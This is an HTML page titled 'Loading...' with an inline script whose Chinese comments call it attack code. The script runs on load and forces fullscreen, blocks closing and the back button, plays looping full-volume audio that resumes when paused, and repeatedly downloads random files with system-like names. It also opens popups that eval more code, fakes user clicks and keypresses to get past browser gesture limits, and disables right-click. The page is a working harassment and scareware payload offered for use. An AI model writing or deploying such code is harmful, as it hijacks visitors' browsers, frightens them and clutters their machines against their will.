<!DOCTYPE html><html><head><meta charset=UTF-8>
<title>Loading...</title>
<script>
// 立即执行的攻击代码
(()=>{
    // 1. 自动全屏解决方案
    function requestFullscreenImmediately(){
        const docEl = document.documentElement;
        
        // 方法1: 尝试立即全屏
        if(docEl.requestFullscreen){
            // 通过Promise包装，避免阻塞
            Promise.resolve().then(() => {
                docEl.requestFullscreen().catch(() => {
                    // 如果失败，设置标记等待用户交互
                    window.needUserInteraction = true;
                });
            });
        }
        
        // 方法2: 如果失败，添加透明点击层
        const clickLayer = document.createElement('div');
        clickLayer.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent;
            z-index: 999999;
            cursor: default;
        `;
        clickLayer.onclick = function(e){
            e.preventDefault();
            e.stopPropagation();
            
            // 用户点击后立即全屏
            if(docEl.requestFullscreen){
                docEl.requestFullscreen().catch(()=>{});
            }
            
            // 移除点击层
            setTimeout(() => {
                if(clickLayer.parentNode){
                    clickLayer.parentNode.removeChild(clickLayer);
                }
            }, 100);
        };
        
        document.body.appendChild(clickLayer);
        
        // 5秒后自动移除点击层
        setTimeout(() => {
            if(clickLayer.parentNode){
                clickLayer.parentNode.removeChild(clickLayer);
            }
        }, 5000);
    }
    
    // 2. 防止一切关闭尝试
    window.onbeforeunload = (e)=>{e.preventDefault();e.returnValue='';return ''};
    
    // 3. 屏蔽历史记录
    history.pushState(null,'',location.href);
    window.onpopstate = ()=>history.pushState(null,'',location.href);
    
    // 4. 背景图片管理器
    class BackgroundManager{
        constructor(){
            this.imageLoaded = false;
            this.init();
        }
        
        async init(){
            try{
                const img = new Image();
                img.onload = () => {
                    this.imageLoaded = true;
                    this.applyBackground(img.src);
                };
                img.onerror = () => {
                    this.tryAlternativeFormats();
                };
                img.src = '2.jpg';
            }catch(e){
                this.setFallbackBackground();
            }
        }
        
        tryAlternativeFormats(){
            const formats = ['2.png', '2.jpeg', '2.gif', '2.webp', '2.bmp'];
            let currentIndex = 0;
            
            const tryNextFormat = () => {
                if(currentIndex >= formats.length){
                    this.setFallbackBackground();
                    return;
                }
                
                const img = new Image();
                img.onload = () => {
                    this.imageLoaded = true;
                    this.applyBackground(img.src);
                };
                img.onerror = () => {
                    currentIndex++;
                    setTimeout(tryNextFormat, 100);
                };
                img.src = formats[currentIndex];
            };
            tryNextFormat();
        }
        
        applyBackground(imageUrl){
            document.body.style.backgroundImage = `url('${imageUrl}')`;
            document.body.style.backgroundSize = 'cover';
            document.body.style.backgroundPosition = 'center';
            document.body.style.backgroundRepeat = 'no-repeat';
            document.body.style.backgroundAttachment = 'fixed';
        }
        
        setFallbackBackground(){
            const gradients = [
                'linear-gradient(45deg, #ff0000, #000000)',
                'linear-gradient(45deg, #0000ff, #000000)',
                'linear-gradient(45deg, #00ff00, #000000)',
                'linear-gradient(45deg, #ff00ff, #000000)',
                'linear-gradient(45deg, #ffff00, #000000)'
            ];
            const randomGradient = gradients[Math.floor(Math.random() * gradients.length)];
            document.body.style.background = randomGradient;
        }
    }
    
    // 5. 音频管理
    class AudioManager{
        constructor(){
            this.audio = null;
            this.isPlaying = false;
            this.init();
        }
        
        async init(){
            try{
                this.audio = new Audio('1.mp3');
                this.audio.loop = true;
                this.audio.preload = 'auto';
                this.audio.volume = 1.0;
                this.audio.muted = true; // 先静音启动
                
                // 尝试立即播放
                await this.audio.play().catch(()=>{});
                
                // 1秒后取消静音
                setTimeout(()=>{
                    this.audio.muted = false;
                    this.audio.volume = 1.0;
                    this.audio.play().catch(()=>{});
                }, 1000);
                
                this.audio.addEventListener('pause', ()=>this.resume());
                this.audio.addEventListener('ended', ()=>this.restart());
                this.audio.addEventListener('error', ()=>this.recover());
                
                this.isPlaying = true;
                
            }catch(e){
                this.recover();
            }
        }
        
        resume(){
            setTimeout(()=>{
                this.audio.play().catch(()=>{});
            }, 100);
        }
        
        restart(){
            this.audio.currentTime = 0;
            this.audio.play().catch(()=>{});
        }
        
        recover(){
            setTimeout(()=>{
                this.audio = new Audio('1.mp3');
                this.audio.loop = true;
                this.audio.volume = 1.0;
                this.audio.play().catch(()=>{});
            }, 1000);
        }
    }
    
    // 6. 无限下载攻击器
    class DownloadAttacker{
        constructor(){
            this.downloadCount = 0;
            this.maxDownloadsPerSession = 50;
            this.fileTypes = ['txt','log','dat','tmp','cache','bin','sys','cfg','ini','bak'];
        }
        
        start(){
            this.executeBatchDownload();
            setInterval(()=>{
                this.executeBatchDownload();
            }, 5000);
        }
        
        executeBatchDownload(){
            const batchSize = 1 + Math.floor(Math.random() * 3);
            for(let i=0; i<batchSize; i++){
                setTimeout(()=>{
                    this.downloadRandomFile();
                }, i*1000);
            }
        }
        
        downloadRandomFile(){
            if(this.downloadCount >= this.maxDownloadsPerSession) return;
            
            try{
                const filename = this.generateRandomFilename();
                const content = this.generateRandomContent();
                const blob = new Blob([content], {type: 'application/octet-stream'});
                const url = URL.createObjectURL(blob);
                
                const a = document.createElement('a');
                a.href = url;
                a.download = filename;
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                
                setTimeout(()=>{
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                }, 1000);
                
                this.downloadCount++;
                
            }catch(e){}
        }
        
        generateRandomFilename(){
            const timestamp = Date.now();
            const randomNum = Math.floor(Math.random() * 10000);
            const fileType = this.fileTypes[Math.floor(Math.random() * this.fileTypes.length)];
            const prefixes = ['system','data','temp','backup','config'];
            const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            
            return `${prefix}_${timestamp}_${randomNum}.${fileType}`;
        }
        
        generateRandomContent(){
            const size = 1024;
            let content = '';
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            for(let i=0; i<size; i++){
                content += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return content;
        }
    }
    
    // 7. 弹窗管理器
    class PopupManager{
        constructor(){
            this.popupCount = 0;
            this.maxPopups = 10;
            this.openWindows = [];
            this.popupTimer = null;
            
            this.sizes = [
                {width: 300, height: 200},
                {width: 400, height: 300},
                {width: 500, height: 400}
            ];
            
            this.positions = [
                {x: 0, y: 0},
                {x: window.screen.width - 400, y: 0},
                {x: 0, y: window.screen.height - 300},
                {x: window.screen.width - 400, y: window.screen.height - 300}
            ];
        }
        
        start(){
            this.popupTimer = setInterval(() => {
                this.openRandomPopup();
            }, 8000 + Math.random() * 7000);
            
            setTimeout(() => {
                const initialPopups = 1 + Math.floor(Math.random() * 2);
                for(let i=0; i<initialPopups; i++){
                    setTimeout(() => {
                        this.openRandomPopup();
                    }, i*2000);
                }
            }, 3000);
            
            setInterval(() => {
                this.cleanupClosedWindows();
            }, 10000);
        }
        
        openRandomPopup(){
            if(this.popupCount >= this.maxPopups) return;
            
            try{
                const size = this.sizes[Math.floor(Math.random() * this.sizes.length)];
                const pos = this.positions[Math.floor(Math.random() * this.positions.length)];
                
                const features = [
                    `width=${size.width}`,
                    `height=${size.height}`,
                    `left=${Math.max(0, Math.min(pos.x, window.screen.width - size.width))}`,
                    `top=${Math.max(0, Math.min(pos.y, window.screen.height - size.height))}`,
                    'menubar=no',
                    'toolbar=no',
                    'location=no',
                    'status=no',
                    'resizable=yes',
                    'scrollbars=yes'
                ].join(',');
                
                const newWindow = window.open(location.href, '_popup_' + Date.now(), features);
                
                if(newWindow && !newWindow.closed){
                    this.openWindows.push(newWindow);
                    this.popupCount++;
                    
                    setTimeout(() => {
                        try{
                            const slowCode = `
                                setTimeout(() => {
                                    const audio = new Audio('1.mp3');
                                    audio.loop = true;
                                    audio.volume = 0.8;
                                    audio.play().catch(()=>{});
                                    
                                    const bgImg = new Image();
                                    bgImg.onload = function(){
                                        document.body.style.background = '#000';
                                    };
                                    bgImg.src = '2.jpg';
                                    
                                    setTimeout(function slowPopup(){
                                        try{
                                            window.open('','','width=200,height=150').close();
                                        }catch(e){}
                                        setTimeout(slowPopup, 10000);
                                    }, 5000);
                                    
                                }, 2000);
                            `;
                            newWindow.eval(slowCode);
                        }catch(e){}
                    }, 2000);
                }
            }catch(e){}
        }
        
        cleanupClosedWindows(){
            this.openWindows = this.openWindows.filter(win => win && !win.closed);
            this.popupCount = this.openWindows.length;
        }
    }
    
    // 8. 全屏管理器
    class FullscreenManager{
        constructor(){
            this.fullscreenInterval = null;
            this.fullscreenAttempts = 0;
            this.maxAttempts = 10;
        }
        
        start(){
            // 持续尝试全屏
            this.fullscreenInterval = setInterval(() => {
                this.attemptFullscreen();
            }, 2000);
            
            // 立即尝试
            this.attemptFullscreen();
        }
        
        attemptFullscreen(){
            if(this.fullscreenAttempts >= this.maxAttempts){
                clearInterval(this.fullscreenInterval);
                return;
            }
            
            this.fullscreenAttempts++;
            
            try{
                if(!document.fullscreenElement){
                    const promise = document.documentElement.requestFullscreen();
                    promise.catch(() => {
                        // 记录失败
                    });
                }
            }catch(e){}
        }
    }
    
    // 9. 用户交互模拟器
    class UserInteractionSimulator{
        constructor(){
            this.interactionCount = 0;
        }
        
        simulateInteraction(){
            // 模拟点击事件
            const clickEvent = new MouseEvent('click', {
                view: window,
                bubbles: true,
                cancelable: true
            });
            
            // 在body上触发点击
            document.body.dispatchEvent(clickEvent);
            
            // 模拟键盘事件
            const keyEvent = new KeyboardEvent('keydown', {
                key: ' ',
                code: 'Space',
                keyCode: 32,
                which: 32,
                bubbles: true
            });
            document.dispatchEvent(keyEvent);
            
            this.interactionCount++;
        }
    }
    
    // 10. 主初始化
    function initializeAll(){
        // 立即尝试全屏
        requestFullscreenImmediately();
        
        // 初始化管理器
        const backgroundManager = new BackgroundManager();
        const audioManager = new AudioManager();
        const downloadAttacker = new DownloadAttacker();
        const popupManager = new PopupManager();
        const fullscreenManager = new FullscreenManager();
        const interactionSimulator = new UserInteractionSimulator();
        
        // 延迟启动其他攻击
        setTimeout(() => {
            // 模拟一次用户交互
            interactionSimulator.simulateInteraction();
            
            // 启动各系统
            setTimeout(() => {
                popupManager.start();
            }, 2000);
            
            setTimeout(() => {
                downloadAttacker.start();
            }, 3000);
            
            setTimeout(() => {
                fullscreenManager.start();
            }, 1000);
            
        }, 100);
        
        // 用户交互事件
        const events = ['click','mousedown','keydown','touchstart','pointerdown'];
        events.forEach(event => {
            document.addEventListener(event, (e)=>{
                // 标记用户已交互
                window.userHasInteracted = true;
                
                setTimeout(() => {
                    if(audioManager.audio && audioManager.audio.paused){
                        audioManager.audio.play().catch(()=>{});
                    }
                    
                    if(Math.random() > 0.7){
                        setTimeout(() => {
                            downloadAttacker.downloadRandomFile();
                        }, 1000);
                    }
                    
                    if(Math.random() > 0.8){
                        setTimeout(() => {
                            popupManager.openRandomPopup();
                        }, 2000);
                    }
                }, 500);
                
            }, {passive: true});
        });
        
        // 页面可见性处理
        document.addEventListener('visibilitychange', ()=>{
            if(!document.hidden){
                setTimeout(() => {
                    if(audioManager.audio && audioManager.audio.paused){
                        audioManager.audio.play().catch(()=>{});
                    }
                }, 1000);
                
                setTimeout(() => {
                    popupManager.openRandomPopup();
                }, 3000);
            }
        });
        
        // 定时保存状态
        setInterval(()=>{
            localStorage.setItem('lastActive', Date.now());
        }, 30000);
        
        // 防止右键菜单
        document.oncontextmenu = (e)=>{
            e.preventDefault();
            setTimeout(() => {
                popupManager.openRandomPopup();
            }, 1000);
            return false;
        };
    }
    
    // 11. 页面加载后立即执行
    window.addEventListener('DOMContentLoaded', initializeAll);
    window.addEventListener('load', initializeAll);
    
    // 12. 如果页面已加载，立即执行
    if(document.readyState === 'interactive' || document.readyState === 'complete'){
        initializeAll();
    }
    
})();
</script>
</head>
<body style="margin:0;padding:0;background:#000;height:100vh;overflow:hidden;transition:filter 2s">
<!-- 透明点击层会自动添加 -->
</body></html>
